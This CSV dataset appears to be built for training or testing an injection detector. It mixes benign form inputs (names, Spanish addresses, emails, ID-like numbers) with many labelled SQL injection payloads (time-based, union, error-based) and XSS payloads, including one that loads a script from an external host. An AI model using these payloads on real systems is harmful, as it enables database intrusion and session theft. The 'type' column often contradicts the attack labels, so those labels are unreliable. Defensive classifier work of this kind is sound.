Text,attack_type,Label,type
legris@beautifulbody.yu,norm,0,normal
1')));begin user_lock.sleep(5); end--,sqli,1,sql
65119692e,norm,0,normal
f09$m3natriz,norm,0,normal
1')) and 6969=(select 6969 from pg_sleep(5)) and (('gjja'='gjja,sqli,1,sql
"-1676'||(select 'xzmu' from dual where 6373=6373 union all select 6373,6373--",sqli,1,sql
estival,norm,0,normal
morfea,norm,0,normal
68623074k,norm,0,normal
mo8os7,norm,0,normal
hilda,norm,0,normal
bu7c2pi,norm,0,normal
"-2248'+(select wuow where 4421=4421 union all select 4421,4421,4421,4421,4421,4421--",sqli,1,sql
gastoni@stainless.iq,norm,0,normal
"1"") where 6903=6903;select (case when (8808=1367) then 1 else 8808*(select 8808 from master..sysdatabases) end)--",sqli,1,sql
"1"");select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (""eboa"" like ""eboa",sqli,1,sql
rodis-ryan@colorprint.info,norm,0,normal
1'))) or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
5068023807822442,norm,0,normal
35212,norm,0,normal
pippo,norm,0,normal
carablanca,norm,0,normal
47355557y,norm,0,normal
"c/ antonio oliver s/n, 4?h",norm,0,normal
52323114t,norm,0,normal
honduras 105,norm,0,normal
porta aylagas,norm,0,normal
ornella,norm,0,normal
humanitari9mo,norm,0,normal
"c/ san cristobal, s/n",norm,0,normal
camino valbueno 106,norm,0,normal
potrear,norm,0,normal
09614,norm,0,normal
80135646n,norm,0,normal
-4389'))) or (1139=3499)*3499 and ((('qoch'='qoch,sqli,1,normal
1') where 8429=8429;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"calle fernando galvan, 192, 7b",norm,0,normal
60929799q,norm,0,normal
cubia cajahuanca,norm,0,normal
"guingueta d'neu, la",norm,0,normal
"1) as bgvd where 1753=1753 and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
nesime,norm,0,normal
2815170427897112,norm,0,normal
"calle sant domenec, 71,",norm,0,normal
64526656h,norm,0,normal
48573885r,norm,0,normal
"c/ palomar, 44,",norm,0,normal
argos,norm,0,normal
"1"" or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)",sqli,1,normal
24836,norm,0,normal
laicismo,norm,0,normal
36830,norm,0,normal
81587818x,norm,0,normal
"major del raval, 14 6?c",norm,0,normal
darbanville@chicasdiabolo.tr,norm,0,normal
"av. escultor pablo gargallo, s/n",norm,0,normal
themselves-ignez@powerthink.cx,norm,0,normal
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1%"" and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1)) as vzgo where 6281=6281 and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
-7552 or 6872=6872,sqli,1,normal
-9556 or (2049=6967)*6967# mhbc,sqli,1,normal
james,norm,0,normal
"calle vivero, s/n",norm,0,normal
"1') as rvli where 4427=4427;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
7509082311963954,norm,0,normal
3591958882412356,norm,0,normal
61218401z,norm,0,normal
nanjar viejo,norm,0,normal
"-7916')) union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",sqli,1,sql
kelcy,norm,0,normal
5825253039721313,norm,0,normal
3114,norm,0,normal
-3834')) as hhiy where 2086=2086 or 3038=3038,sqli,1,normal
carulla,norm,0,normal
"martin machio, 31",norm,0,normal
"1%"") or 2367=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
granach@mccomptables.be,norm,0,normal
medus?a,norm,0,normal
">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>",xss,2,sql
09260,norm,0,normal
santini_baretto@zarahealth.bm,norm,0,normal
katcher@tabernarinconete.nr,norm,0,normal
098oro4a4,norm,0,normal
d47tesi1,norm,0,normal
2319,norm,0,normal
3902,norm,0,normal
"-5667%')) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('%'='",sqli,1,sql
wittik,norm,0,normal
"1') as scnn where 9274=9274;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
19482682a,norm,0,normal
ruick_heasley4@18horas.ro,norm,0,normal
69054908f,norm,0,normal
89910635r,norm,0,normal
3892784649587009,norm,0,normal
"calle maldonadas, s/n 4h",norm,0,normal
"1%""))) and 8594=(select 8594 from pg_sleep(5))--",sqli,1,sql
-2715')) or 6942=1636 and (('mqeq'='mqeq,sqli,1,normal
">""&<script>document.cookie=true;</script>",xss,2,xss
aliseda fullat,norm,0,normal
1) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (3836=3836,sqli,1,sql
"1')) as ticp where 9794=9794 union all select null,null,null,null,null,null,null,null--",sqli,1,sql
1 where 9872=9872;select (case when (3863=1151) then 3863 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
(select chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7812=7812) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113) from dual),sqli,1,sql
"1') as oknw where 8777=8777;iif(4836=1823,1,1/0)",sqli,1,sql
3055509843252102,norm,0,normal
"1%""))) or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
cardias,norm,0,normal
condensativo,norm,0,normal
vadell comalada,norm,0,normal
alargamiento,norm,0,normal
c7em,norm,0,normal
campillo de llerena,norm,0,normal
"-9672%""))) order by 1#",sqli,1,normal
martell canasa,norm,0,normal
vyky,norm,0,normal
0oll10n,norm,0,normal
escobedo santagata,norm,0,normal
"-2639"") where 1494=1494 union all select 1494--",sqli,1,sql
reiko,norm,0,normal
masao,norm,0,normal
"1'||(select 'vsfg' where 3547=3547 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161))||'",sqli,1,sql
"1 or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)# utdm",sqli,1,normal
tadlock,norm,0,normal
"c/ la hortensia, s/n",norm,0,normal
"1) where 6720=6720 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
morata de jiloca,norm,0,normal
70153248m,norm,0,normal
gerianne,norm,0,normal
yunquera de henares,norm,0,normal
bettine,norm,0,normal
quintela de leirado,norm,0,normal
1'+(select 'vddk' where 6961=6961;if(4194=4133) select 4194 else drop function tqhz--,sqli,1,sql
quintiliana,norm,0,normal
"<img id=xss src="" javascript:alert('xss');"">",xss,2,xss
"-1526')) or elt(1032=1032,3623) and (('xpob'='xpob",sqli,1,normal
corzn ascencao,norm,0,normal
peralejos de abajo,norm,0,normal
averell9,norm,0,normal
zemanek,norm,0,normal
almazara,norm,0,normal
lara,norm,0,normal
"travesia san lazaro, 86",norm,0,normal
"1%""))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
corpa,norm,0,normal
"1') as kbja where 4275=4275 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
lonald8,norm,0,normal
59718568b,norm,0,normal
g8629e8d9r,norm,0,normal
9667,norm,0,normal
sirola@professionalhost.cc,norm,0,normal
"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",sqli,1,sql
"-8888%') union all select 5312,5312,5312,5312,5312,5312,5312,5312--",sqli,1,sql
"1) as wxms where 7272=7272 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
despamplonar,norm,0,normal
bronny,norm,0,normal
1' or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
"1')) as qaki where 5272=5272;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
steele-kripilani@vendomiatico.se,norm,0,normal
"-4984%""))) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",sqli,1,sql
2637,norm,0,normal
8355091548756460,norm,0,normal
alh4a3,norm,0,normal
boget brufau,norm,0,normal
-4785' or (8459=8459)*4906 and 'esfn'='esfn,sqli,1,normal
exceptacin,norm,0,normal
"1"") or (select * from (select(sleep(5)))ydpu) and (""gixv""=""gixv",sqli,1,sql
murero,norm,0,normal
branchadell arribas,norm,0,normal
"-9145') as xyya where 8950=8950 union all select 8950,8950,8950,8950,8950,8950,8950,8950--",sqli,1,sql
4501987508782909,norm,0,normal
9817,norm,0,normal
"1""));select benchmark(5000000,md5(0x4c4d6142)) and ((""vcvb"" like ""vcvb",sqli,1,sql
rebollo fita,norm,0,normal
boccaccini basart,norm,0,normal
particular teresa orozco 101,norm,0,normal
"travesia del mercado, s/n,",norm,0,normal
"-6406%') or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('%'='",sqli,1,sql
casper,norm,0,normal
-2393%')) union all select 2772--,sqli,1,sql
hoyo higueron 32 3-f,norm,0,normal
"1%"")) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ((""%""=""",sqli,1,sql
45112,norm,0,normal
"camino carabineros, 10",norm,0,normal
laguna del marquesado,norm,0,normal
"1%')));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ((('%'='",sqli,1,sql
"1') as ljpy where 8270=8270 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
34361279s,norm,0,normal
peuela sains,norm,0,normal
97co38225s9,norm,0,normal
"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw",sqli,1,sql
326,norm,0,normal
stahel,norm,0,normal
joudrey,norm,0,normal
47901295t,norm,0,normal
producti8,norm,0,normal
kuzz,norm,0,normal
"-9829'))) or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
tvara ganci,norm,0,normal
calle marques de santillana 146 9b,norm,0,normal
"1"") where 5938=5938 and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
faustiniano,norm,0,normal
castil de peones,norm,0,normal
"1'));select benchmark(5000000,md5(0x4c4d6142)) and (('nczi'='nczi",sqli,1,sql
"1"") as bpmk where 4506=4506;select (case when (3855=3855) then 3855 else 1/(select 0) end)--",sqli,1,sql
"<!--#exec cmd=""/bin/echo '<script src'""--><!--#exec cmd=""/bin/echo '=http://ha.ckers.org/xss.js></script>'""-->",xss,2,xss
erny1,norm,0,normal
870,norm,0,normal
nickolau,norm,0,normal
koline.mathieson@viavilano.lv,norm,0,normal
blondell3,norm,0,normal
enedn,norm,0,normal
"-6846%"")) or (8459=8459)*4906 and ((""%""=""",sqli,1,normal
"1' where 7464=7464 and 2388=benchmark(5000000,md5(0x6d457153))#",sqli,1,normal
denice,norm,0,normal
<script src=//vulnerability-lab.com/.js>,xss,2,normal
"1"") or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (""nnmz"" like ""nnmz",sqli,1,sql
84ambel,norm,0,normal
"<xml id=xss src=""xsstest.xml"" id=i></xml><span dataid=xss src=#i datafld=c dataformatas=html></span>",xss,2,normal
"1"")) as uaxn where 5657=5657 rlike (select (case when (3548=7206) then 1 else 0x28 end))--",sqli,1,sql
drayton,norm,0,normal
"1"") and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
0esino1o,norm,0,normal
6e0turer2,norm,0,normal
"calle escultor abrahan cardenes 162,",norm,0,normal
87356578w,norm,0,normal
marlet esparraguera,norm,0,normal
5818,norm,0,normal
novillas,norm,0,normal
shazmnn,norm,0,normal
15423399j,norm,0,normal
biurrun-olcoz,norm,0,normal
"1) where 4698=4698 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"1%"" union all select null,null,null,null,null--",sqli,1,sql
pasaje cruz de mayo 108 1?c,norm,0,normal
turcia,norm,0,normal
"1%' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and '%'='",sqli,1,sql
1);select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
3128013884204713,norm,0,normal
"olmos, los",norm,0,normal
"1"") union all select null,null,null,null--",sqli,1,sql
"1;create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)",sqli,1,sql
4752,norm,0,normal
4350,norm,0,normal
"1'||(select 'xyrk' from dual where 9844=9844 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">",xss,2,xss
"1"")))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (((""kfdh"" like ""kfdh",sqli,1,sql
"1""))) and sleep(5)#",sqli,1,normal
kirbee,norm,0,normal
"1"") as qmtx where 5280=5280 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
54716363f,norm,0,normal
23611,norm,0,normal
"1"") where 6859=6859 union all select null,null,null,null,null,null,null,null#",sqli,1,sql
10729,norm,0,normal
irre2u3er6b22,norm,0,normal
1%'))) and sleep(5) and ((('%'=',sqli,1,normal
5036144025003599,norm,0,normal
7694435206249147,norm,0,normal
4ntrometim13nt6,norm,0,normal
misczak,norm,0,normal
fickes,norm,0,normal
"1"") where 1833=1833;select (case when (3344=8103) then 3344 else 1/(select 0) end)--",sqli,1,sql
padiernos,norm,0,normal
72588514p,norm,0,normal
08466616v,norm,0,normal
"1'+(select 'phtz' where 3171=3171;select count(*) from generate_series(1,5000000)--",sqli,1,sql
alternat,norm,0,normal
"-6760 or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))# ikqw",sqli,1,sql
1') where 2852=2852;select case when 7717=7717 then 1 else null end--,sqli,1,sql
-8615))) or 4039=9144,sqli,1,normal
kofoed@serviconlevante.mr,norm,0,normal
95554434z,norm,0,normal
"1') as ycsr where 2238=2238 and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"1 where 8333=8333 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1'+(select 'yjpp' where 8966=8966;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)+'",sqli,1,sql
calle panaderas de san cecilio 168,norm,0,normal
erfani,norm,0,normal
malethia,norm,0,normal
"1') where 1115=1115;call regexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1,sql
"1') or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1,normal
busoms redolad,norm,0,normal
"1 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)",sqli,1,sql
1) and 4595=4595#,sqli,1,normal
1')) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (('trzi'='trzi,sqli,1,sql
f5-c21s7,norm,0,normal
ciuffini@firstchoicecoffee.ge,norm,0,normal
parton@necesitocurro.mt,norm,0,normal
9061531800144737,norm,0,normal
"-9313%"") or 5971=4572#",sqli,1,normal
03518,norm,0,normal
calle nieto 41,norm,0,normal
2689,norm,0,normal
-3083) or 5221=7829,sqli,1,normal
p57at84o,norm,0,normal
elvian,norm,0,normal
1' in boolean mode) rlike (select (case when (1343=1595) then 1 else 0x28 end))#,sqli,1,sql
1'||(select 'puco' where 2605=2605 union all select null#,sqli,1,sql
"1""))) and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and (((""umne"" like ""umne",sqli,1,sql
zachrisson satalia,norm,0,normal
buitrago pontigo,norm,0,normal
33437614f,norm,0,normal
ulldemol bujeque,norm,0,normal
pallars 20 12?a,norm,0,normal
puente la reina/gares,norm,0,normal
"1') and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
tiza,norm,0,normal
50700,norm,0,normal
-8753) order by 1#,sqli,1,normal
94430620a,norm,0,normal
1381,norm,0,normal
"1') and elt(1210=1210,sleep(5)) and ('medg'='medg",sqli,1,normal
"-4876"")) as saug where 2256=2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",sqli,1,sql
"c/ galicia, 180,",norm,0,normal
"tras castelo 75, 7g",norm,0,normal
17923027r,norm,0,normal
"1"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""ekjs"" like ""ekjs",sqli,1,sql
11690,norm,0,normal
37120,norm,0,normal
"1' in boolean mode) procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#",sqli,1,normal
"-6527')) union all select 5053,5053,5053,5053--",sqli,1,sql
"1%"" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq') and ""%""=""",sqli,1,sql
"plza. alemania, 134, 12?f",norm,0,normal
mazza esplugas,norm,0,normal
overdyke,norm,0,normal
1 union all select null#,sqli,1,sql
"1' union all select null,null#",sqli,1,sql
gino,norm,0,normal
1 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric),sqli,1,sql
seaman@salaparis.ws,norm,0,normal
37257,norm,0,normal
27597488h,norm,0,normal
herbers,norm,0,normal
2169,norm,0,normal
-4323')) or 6968=1393,sqli,1,normal
geeta,norm,0,normal
19784273h,norm,0,normal
29967631b,norm,0,normal
"'';!--""<xss>=&{()}",xss,2,sql
"1%'))) or elt(6272=6272,sleep(5)) and ((('%'='",sqli,1,normal
"camino de leganes, 13",norm,0,normal
"1) as itvm where 1482=1482;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
im$ponderable,norm,0,normal
arima@hormigon-impreso.nu,norm,0,normal
deimos 147 12?a,norm,0,normal
"1')) as atpy where 9020=9020 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
1)) and (4169=9887)*9887 and ((1137=1137,sqli,1,normal
